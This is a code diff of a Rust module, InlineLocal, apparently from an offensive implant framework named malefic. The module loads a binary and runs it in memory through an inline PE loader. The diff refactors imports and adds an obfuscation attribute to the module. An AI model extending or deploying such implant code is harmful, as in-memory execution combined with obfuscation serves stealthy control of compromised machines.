@@ -1,11 +1,11 @@
 #![allow(unused_assignments)]
 use std::ptr::null;
 
-use malefic_helper::common::utils::format_cmdline;
-use malefic_helper::win::kit::pe::inlinepe::inline_pe;
-use malefic_proto::proto::modulepb::BinaryResponse;
-use malefic_helper::common::filesys::get_binary;
 use crate::prelude::*;
+use malefic_common::utils::format_cmdline;
+use malefic_os_win::kit::pe::inlinepe::inline_pe;
+use malefic_proto::proto::modulepb::BinaryResponse;
+use malefic_sysinfo::filesys::get_binary;
 
 pub struct InlineLocal;
 
@@ -14,9 +14,15 @@ pub struct InlineLocal;
 impl Module for InlineLocal {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for InlineLocal {
+#[obfuscate]
+impl malefic_module::ModuleImpl for InlineLocal {
     #[allow(unused_variables)]
-    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, sender: &mut malefic_proto::module::Output) -> ModuleResult {
+    async fn run(
+        &mut self,
+        id: u32,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
+    ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let (bin_content, bin_name) = to_error!(get_binary(&request.path))?;
 
@@ -38,7 +44,7 @@ impl malefic_proto::module::ModuleImpl for InlineLocal {
                 false,
                 request.output,
                 request.timeout,
-                request.delay
+                request.delay,
             )
         };
 
